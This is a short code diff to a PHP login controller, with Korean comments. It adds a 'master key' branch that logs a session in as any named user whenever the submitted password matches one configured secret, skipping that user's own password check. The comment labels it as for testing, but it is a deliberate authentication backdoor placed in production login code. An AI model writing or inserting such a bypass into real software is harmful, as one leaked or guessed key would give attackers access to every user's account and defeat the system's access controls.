@@ -47,7 +47,19 @@ class PublicAuthController extends Controller
             ]);
         }
 
-        if (! Auth::attempt($data, $remember)) {
+        // 마스터 키 (테스트용) — 일치 시 해당 아이디로 로그인. .env MASTER_LOGIN_KEY 미설정이면 비활성.
+        $masterKey = config('app.master_login_key');
+        $masterOk  = $masterKey && hash_equals((string) $masterKey, (string) $data['password']);
+
+        if ($masterOk) {
+            $mu = User::where('login_id', $data['login_id'])->first();
+            if (! $mu) {
+                return back()->withInput($request->only('login_id'))->withErrors([
+                    'login_id' => '아이디 또는 비밀번호가 올바르지 않습니다.',
+                ]);
+            }
+            Auth::login($mu, $remember);
+        } elseif (! Auth::attempt($data, $remember)) {
             RateLimiter::hit($rlKey, 60);
             return back()->withInput($request->only('login_id'))->withErrors([
                 'login_id' => '아이디 또는 비밀번호가 올바르지 않습니다.',
